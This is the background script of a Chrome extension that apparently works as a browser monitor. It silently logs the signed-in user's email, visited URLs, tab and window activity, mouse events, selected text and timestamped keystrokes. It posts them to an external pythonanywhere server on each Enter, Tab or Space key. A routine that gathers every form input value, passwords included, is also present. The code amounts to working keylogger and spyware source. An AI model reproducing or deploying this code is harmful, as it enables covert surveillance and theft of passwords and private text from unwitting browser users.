//Global list to store tab's URL
var urls = [];

// React when a browser action's icon is clicked.
chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
	var ctimestamp = Date.now();
	//Sync Keystrokes of the previous tab (if any)
	if(localStorage.getItem("keystrokes") != null){
		if(localStorage.getItem("keystrokes").length > 0){
			syncData(localStorage.getItem('userid'), 'Key', ''+localStorage.getItem("taburl"), ""+localStorage.getItem("keystrokes"), ctimestamp);
			localStorage.removeItem("keystrokes");
		}
	}
	//console.log("urltab: "+changeInfo.url);
	if(changeInfo.url){
		urls[tabId] = changeInfo.url;
	}
    if(changeInfo.status == "complete"){ 
        //do url check
		var url_str = tab.url;
		urls[tabId] = tab.url;
        var patt = new RegExp("chrome://");
        var res = patt.test(url_str);
		if(res == false){
			var datestamp = new Date(ctimestamp).toUTCString();
			//alert(tab.url);
			console.log("URL: "+tab.url+" ~"+ new Date(ctimestamp).toUTCString()+" | "+localStorage.getItem('userid'));
			//console.log("date: "+ctimestamp+" | "+new Date(ctimestamp).toUTCString()+" | " +new Date(datestamp).getTime());
			//chrome.tabs.executeScript(tab.id, {code: "(" + contentscri.toString() + ")()" });
			localStorage.setItem("taburl", url_str);
			syncData(localStorage.getItem('userid'), 'Tab', tab.url, "New Tab", ctimestamp);
		}else{
			//console.log("nooo.....");
		}
    }
});

//Notification
function notifyMe(mesg) {
  // Let's check if the browser supports notifications
  if (!("Notification" in window)) {
    alert("This browser does not support desktop notification");
  }

  // Let's check if the user is okay to get some notification
  else if (Notification.permission === "granted") {
    // If it's okay let's create a notification
    var notification = new Notification(mesg);
  }

  // Otherwise, we need to ask the user for permission
  // Note, Chrome does not implement the permission static property
  // So we have to check for NOT 'denied' instead of 'default'
  else if (Notification.permission !== 'denied') {
    Notification.requestPermission(function (permission) {

      // Whatever the user answers, we make sure we store the information
      if(!('permission' in Notification)) {
        Notification.permission = permission;
      }

      // If the user is okay, let's create a notification
      if (permission === "granted") {
        var notification = new Notification(mesg);
      }
    });
  }

  // At last, if the user already denied any notification, and you 
  // want to be respectful there is no need to bother him any more.
}

//Gets User Email on first launch of the app and stores it in LocalStorage
chrome.identity.getProfileUserInfo(function(userInfo){
	if(userInfo.email == ""){
		//alert("Please Sign-In to Chrome Browser.");
		notifyMe("Please Sign-In to Chrome Browser.");
		storeUserID("NULL");
	}else{
		console.log("User: "+userInfo.email);
		//alert("aah: "+localStorage.getItem('userid'));
		/* if(localStorage.getItem('userid') == null || localStorage.getItem('userid').indexOf('@') == -1){
			notifyMe("Chrome Monitor enabled for account: "+userInfo.email);
		} */
		storeUserID(userInfo.email);
	}
	localStorage.removeItem("keystrokes");
});

//If the User changed the email id for the browser then this event is fired
//And the new email id is stored in the LocalStorage
chrome.identity.onSignInChanged.addListener(function(account, signedIn){
	console.log(account.id+" ~ "+signedIn);
	chrome.identity.getProfileUserInfo(function(userInfo){
		if(userInfo.email == ""){
			//alert("Please Login to Chrome Browser");
			notifyMe("Please Sign-In to Chrome Browser.");
		}else{
			console.log("User: "+userInfo.email);
			//notifyMe("Chrome Monitor enabled for account: "+userInfo.email);
			storeUserID(userInfo.email);
		}
		localStorage.removeItem("keystrokes");
	});
});

//Function to store the given emailid to LocalStorage
function storeUserID(emailidstr) {
	if (typeof(localStorage) == 'undefined' ) {
	  alert('Your browser does not support HTML5 localStorage. Try upgrading your browser.');
	}
	else {
	  try {
		  if(emailidstr != "NULL"){
			localStorage.setItem("userid", emailidstr); //saves to the database, “key”, “value”
			console.log("Saved USER: "+emailidstr);
			//console.log("SAVED: "+localStorage.getItem('userid'));
			//console.log("hexval: "+getRandomToken());
		  }else{
			var hexval = getRandomToken(); 
			localStorage.setItem("userid", "Chrome"+hexval);
			console.log("Saved USER: "+hexval);
			//console.log("SAVED: "+localStorage.getItem('userid'));
		  }
	  }
	  catch (e) {
		/* if (e == QUOTA_EXCEEDED_ERR) {
		  alert('Quota exceeded!'); //data wasn’t successfully saved due to quota exceed so throw an error
		} */
		alert("Error: LOCAL STORAGE | "+e);
	  }
	  //document.write(localStorage.getItem('userid')); //Hello World!
	  //localStorage.removeItem('userid'); //deletes the matching item from the database
	}
}

//Random Hex Code
function getRandomToken() {
    // E.g. 8 * 16 = 128 bits token
    var randomPool = new Uint8Array(32);
    crypto.getRandomValues(randomPool);
    var hex = '';
    for (var i = 0; i < randomPool.length; ++i) {
        hex += randomPool[i].toString(16);
    }
    // E.g. db18458e2782b2b77e36769c569e263a53885a9944dd0a861e5064eac16f1a
    return hex.substring(0,12);
}

//Fetch all "Input" fields in the webpage and display them
function contentscri() {
	try {
		inputs = document.getElementsByTagName('input');
		//alert("inputs: "+inputs.length);
		//console.log("Size: "+inputs.length);
		var logformfields = '';
		for (index = 0; index < inputs.length; ++index) {
				//console.log(inputs[index]+":"+inputs[index].value+"\n");				
				logformfields += inputs[index]+"~ "+inputs[index].name+": "+inputs[index].value+" ["+inputs[index].type+"]\n";
				//alert(inputs[index]+":"+inputs[index].value);
		}
		chrome.extension.sendMessage({greeting: "hello", data: ""+logformfields}, function(response) {
			console.log(response);
		});
	} catch(e) {
		console.log(e);
	}
}

//Listener to capture switch between tabs on the browser
chrome.tabs.onActivated.addListener(function(changeInfo) {
	var ctimestamp = Date.now();
	//Sync Keystrokes of the previous tab (if any)
	if(localStorage.getItem("keystrokes") != null){
		if(localStorage.getItem("keystrokes").length > 0){
			syncData(localStorage.getItem('userid'), 'Key', ''+localStorage.getItem("taburl"), ""+localStorage.getItem("keystrokes"), ctimestamp);
			localStorage.removeItem("keystrokes");
		}
	}
	var tab = chrome.tabs.get(changeInfo.tabId, function(tab) {
		var url_str = tab.url;
		urls[changeInfo.tabId] = tab.url;
        var patt = new RegExp("chrome://");
        var res = patt.test(url_str);
		if(res == false){
			var datestamp = new Date(ctimestamp).toUTCString();
			//alert("Moved to: "+tab.url);
			console.log("URL: Switched "+tab.url+" ~"+ new Date(ctimestamp).toUTCString()+" | "+localStorage.getItem('userid'));
			//console.log("date: "+ctimestamp+" | "+new Date(ctimestamp).toUTCString()+" | " +new Date(datestamp).getTime());	
			//chrome.tabs.executeScript(tab.id, {code: "(" + contentscri.toString() + ")()" });
			localStorage.setItem("taburl", url_str);
			syncData(localStorage.getItem('userid'), 'Tab', tab.url, "Tab Switched", ctimestamp);
		}else{
			//console.log("ACT: nooo.....");
		}
    });
});

//Listener to capture tab close
chrome.tabs.onRemoved.addListener(function(tabId, removeInfo){
	try {
		var ctimestamp = Date.now();
		if(urls[tabId]){
			var datestamp = new Date(ctimestamp).toUTCString();
			//alert("Moved to: "+tab.url);
			console.log("URL: Closed "+urls[tabId]+" ~"+ new Date(ctimestamp).toUTCString()+" | "+localStorage.getItem('userid'));
			//console.log("date: "+ctimestamp+" | "+new Date(ctimestamp).toUTCString()+" | " +new Date(datestamp).getTime());	
			//chrome.tabs.executeScript(tab.id, {code: "(" + contentscri.toString() + ")()" });
			syncData(localStorage.getItem('userid'), 'Tab', urls[tabId], "Tab Closed", ctimestamp);
		} else {
			console.log("URL: Closed "+tabId);
			syncData(localStorage.getItem('userid'), 'Tab', '', "Tab Closed [TabID:"+tabId+"]", ctimestamp);
		}
	} catch(e) {
		console.log(e);
	}
});

//Listener to capture Window closed
chrome.windows.onRemoved.addListener(function(windowId){
	try{
		var ctimestamp = Date.now();
		console.log("Window: Closed "+ new Date(ctimestamp).toUTCString()+" | "+localStorage.getItem('userid'));
		syncData(localStorage.getItem('userid'), 'Window', '', "Window Closed", ctimestamp);
		if(localStorage.getItem("keystrokes") != null){
			if(localStorage.getItem("keystrokes").length > 0){
				syncData(localStorage.getItem('userid'), 'Key', ''+localStorage.getItem("taburl"), ""+localStorage.getItem("keystrokes"), ctimestamp);
				localStorage.removeItem("keystrokes");
			}
		}
		localStorage.removeItem("taburl");
	} catch(e) {
		console.log(e);
	}
});

//Listen to capture Window created
chrome.windows.onCreated.addListener(function(window){
	var ctimestamp = Date.now();
	console.log("Window:"+window.state+" | "+ctimestamp);
	syncData(localStorage.getItem('userid'), 'Window', '', "Window Created", ctimestamp);
});

//Listen to Window Focus changed event
chrome.windows.onFocusChanged.addListener(function(windowId) {
    //console.log("Focus changed. "+windowId);
	var ctimestamp = Date.now();
	if(windowId != -1){
		chrome.windows.get(windowId, function(window){
			console.log("Window: "+window.state+" | "+ctimestamp);
			syncData(localStorage.getItem('userid'), 'Window', '', "Window "+window.state, ctimestamp);
		});
	}else{
		console.log("Window: Possible Minimize | "+ctimestamp);
		syncData(localStorage.getItem('userid'), 'Window', '', "Window -Possible Minimize", ctimestamp);
	}
});

function syncData(emailid, eventtype, urllink, datas, ts){
	var http = new XMLHttpRequest();
	var url = "https://autocode.pythonanywhere.com/BrowserMonitoring/webapi/syncdata";
	//var params = "datas=clicked&ts="+Date.now();
	var params = "emailid="+emailid+"&eventtype="+eventtype+"&urllink="+urllink+"&datas="+datas+"&ts="+ts;
	//alert(params);
	http.open("POST", url, true);

	//Send the proper header information along with the request
	http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	//http.setRequestHeader("Content-length", params.length);
	http.setRequestHeader("Connection", "close");

	http.onreadystatechange = function() {//Call a function when the state changes.
		if(http.readyState == 4 && http.status == 200) {
			//alert(http.responseText);
			console.log("Send Data to server: "+http.status+"| "+http.responseText);
		}
	}
	http.send(params);
}

//Invoke the contentscript.js file on page load
chrome.tabs.query({active: true}, function(tab){
	//alert("In this");
	try{
		chrome.tabs.executeScript(tab.id, {file: "contentscript.js"});
	} catch(e){
		console.log(e);
	}
});

//Listen to the system state to identify if its awake / idle / locked
chrome.idle.onStateChanged.addListener(function(newState){
	var ctimestamp = Date.now();
	console.log("Machine State: "+newState+" | "+new Date(ctimestamp).toUTCString());
	syncData(localStorage.getItem('userid'), 'Screen', ''+localStorage.getItem("taburl"), ""+newState, ctimestamp);
	if(localStorage.getItem("keystrokes") != null){
		if(localStorage.getItem("keystrokes").length > 0){
			syncData(localStorage.getItem('userid'), 'Key', ''+localStorage.getItem("taburl"), ""+localStorage.getItem("keystrokes"), ctimestamp);
			localStorage.removeItem("keystrokes");
		}
	}
});

//Listener to listen to chrome messages. Messages passed from contentscript.js
//The messages are then printed to console
chrome.extension.onMessage.addListener(function(request, sender, callback) {
	//console.log("in extOnReq");
	var ctimestamp = Date.now();
    switch (request.greeting) {
        case 'hello':
            var data = request.data;
            // Sync Input field values.
			console.log("Input: "+data +" | "+localStorage.getItem('userid'));
			//syncData(localStorage.getItem('userid'), 'Input', ''+localStorage.getItem("taburl"), ""+data, ctimestamp);
            break;
		case 'keys':
			var data = request.data;
            // Sync keystrokes.
			console.log("Keys: "+data +" | "+localStorage.getItem('userid'));
			try{
				var temp = localStorage.getItem("keystrokes");
				if(temp != null){
					localStorage.setItem("keystrokes", temp+ ' ' + getTheKey(parseInt(data))+"("+new Date(ctimestamp).toLocaleTimeString()+")");
					if(data == '13' || data == '9' || data == '32'){
						console.log("Enter Key Pressed ! ");
						console.log("KeyData: "+localStorage.getItem("keystrokes"));
						syncData(localStorage.getItem('userid'), 'Key', ''+localStorage.getItem("taburl"), ""+localStorage.getItem("keystrokes"), ctimestamp);
						localStorage.removeItem("keystrokes");
					}
				}else{
					localStorage.setItem("keystrokes", getTheKey(parseInt(data))+"("+new Date(ctimestamp).toLocaleTimeString()+")");
				}
				console.log("KeyData: "+localStorage.getItem("keystrokes"));
			}catch(e){
				console.log("Error: "+e);
			}
            break;
		case 'keypress':
			var data = request.data;
            // Sync keystrokes.
			console.log("KeysPress: "+data +" | "+localStorage.getItem('userid'));
			try{
				var temp = localStorage.getItem("keystrokes");
				if(temp != null){
					localStorage.setItem("keystrokes", temp+ ' ' + getTheCharKey(parseInt(data))+"("+new Date(ctimestamp).toLocaleTimeString()+")");
					if(data == '13' || data == '9' || data == '32'){
						console.log("Enter Key Pressed ! ");
						console.log("KeyData: "+localStorage.getItem("keystrokes"));
						syncData(localStorage.getItem('userid'), 'Key', ''+localStorage.getItem("taburl"), ""+localStorage.getItem("keystrokes"), ctimestamp);
						localStorage.removeItem("keystrokes");
					}
				}else{
					localStorage.setItem("keystrokes", getTheCharKey(parseInt(data))+"("+new Date(ctimestamp).toLocaleTimeString()+")");
				}
				console.log("KeyData: "+localStorage.getItem("keystrokes"));
			}catch(e){
				console.log("Error: "+e);
			}
            break;
		case 'mouse':
			var data = request.data;
            // Sync mouse event.
			console.log("Mouse: "+data +" | "+localStorage.getItem('userid'));
			syncData(localStorage.getItem('userid'), 'Mouse', ''+localStorage.getItem("taburl"), ""+data, ctimestamp);
            break;
		case 'selected':
			var data = request.data;
            // If highlighted text present then sync
			if(data.trim()!=''){
				console.log("Selected: "+data +" | "+localStorage.getItem('userid'));
				syncData(localStorage.getItem('userid'), 'Selected', ''+localStorage.getItem("taburl"), ""+data, ctimestamp);
			}
            break;
     }
});

function getTheKey(charCode){
	var textBox = String.fromCharCode(charCode);
	//console.log("~CHARCODE: "+charCode+" | "+textBox);
	  if (charCode == 8) textBox = "[BACKSPACE]"; //  backspace
      if (charCode == 9) textBox = "[TAB]"; //  tab
      if (charCode == 13) textBox = "[ENTER]"; //  enter
      if (charCode == 16) textBox = "[SHIFT]"; //  shift
      if (charCode == 17) textBox = "[CTRL]"; //  ctrl
      if (charCode == 18) textBox = "[ALT]"; //  alt
      if (charCode == 19) textBox = "[PAUSE/BREAK]"; //  pause/break
      if (charCode == 20) textBox = "[CAPSLOCK]"; //  caps lock
      if (charCode == 27) textBox = "[ESCAPE]"; //  escape
	  if (charCode == 32) textBox = "[SPACEBAR]"; // spacebar
      if (charCode == 33) textBox = "[PAGEUP]"; // page up, to avoid displaying alternate character and confusing people             
      if (charCode == 34) textBox = "[PAGEDOWN]"; // page down
      if (charCode == 35) textBox = "[END]"; // end
      if (charCode == 36) textBox = "[HOME]"; // home
      if (charCode == 37) textBox = "[LEFTARROW]"; // left arrow
      if (charCode == 38) textBox = "[UPARROW]"; // up arrow
      if (charCode == 39) textBox = "[RIGHTARROW]"; // right arrow
      if (charCode == 40) textBox = "[DOWNARROW]"; // down arrow
      if (charCode == 45) textBox = "[INSERT]"; // insert
      if (charCode == 46) textBox = "[DELETE]"; // delete
      if (charCode == 91) textBox = "[LEFTWINDOW]"; // left window
      if (charCode == 92) textBox = "[RIGHTWINDOW]"; // right window
      if (charCode == 93) textBox = "[SELECTKEY]"; // select key
      if (charCode == 96) textBox = "[NUMPAD0]"; // numpad 0
      if (charCode == 97) textBox = "[NUMPAD1]"; // numpad 1
      if (charCode == 98) textBox = "[NUMPAD2]"; // numpad 2
      if (charCode == 99) textBox = "[NUMPAD3]"; // numpad 3
      if (charCode == 100) textBox = "[NUMPAD4]"; // numpad 4
      if (charCode == 101) textBox = "[NUMPAD5]"; // numpad 5
      if (charCode == 102) textBox = "[NUMPAD6]"; // numpad 6
      if (charCode == 103) textBox = "[NUMPAD7]"; // numpad 7
      if (charCode == 104) textBox = "[NUMPAD8]"; // numpad 8
      if (charCode == 105) textBox = "[NUMPAD9]"; // numpad 9
      if (charCode == 106) textBox = "[MULTIPLY]"; // multiply
      if (charCode == 107) textBox = "[ADD]"; // add
      if (charCode == 109) textBox = "[SUBTRACT]"; // subtract
      if (charCode == 110) textBox = "[DECIMALPOINT]"; // decimal point
      if (charCode == 111) textBox = "[DIVIDE]"; // divide
      if (charCode == 112) textBox = "[F1]"; // F1
      if (charCode == 113) textBox = "[F2]"; // F2
      if (charCode == 114) textBox = "[F3]"; // F3
      if (charCode == 115) textBox = "[F4]"; // F4
      if (charCode == 116) textBox = "[F5]"; // F5
      if (charCode == 117) textBox = "[F6]"; // F6
      if (charCode == 118) textBox = "[F7]"; // F7
      if (charCode == 119) textBox = "[F8]"; // F8
      if (charCode == 120) textBox = "[F9]"; // F9
      if (charCode == 121) textBox = "[F10]"; // F10
      if (charCode == 122) textBox = "[F11]"; // F11
      if (charCode == 123) textBox = "[F12]"; // F12
      if (charCode == 144) textBox = "[NUMLOCK]"; // num lock
      if (charCode == 145) textBox = "[SCROLLLOCK]"; // scroll lock
      if (charCode == 186) textBox = ";"; // semi-colon
      if (charCode == 187) textBox = "="; // equal-sign
      if (charCode == 188) textBox = ","; // comma
      if (charCode == 189) textBox = "-"; // dash
      if (charCode == 190) textBox = "."; // period
      if (charCode == 191) textBox = "/"; // forward slash
      if (charCode == 192) textBox = "`"; // grave accent
      if (charCode == 219) textBox = "["; // open bracket
      if (charCode == 220) textBox = "\\"; // back slash
      if (charCode == 221) textBox = "]"; // close bracket
      if (charCode == 222) textBox = "'"; // single quote
	//console.log("~CHARCODE: "+charCode+" | "+textBox);
	return textBox;
}

function getTheCharKey(charCode){
	var textBox = String.fromCharCode(charCode);
	//console.log("KEYPRESS: ----- "+charCode+" | "+textBox);
	return textBox;
}
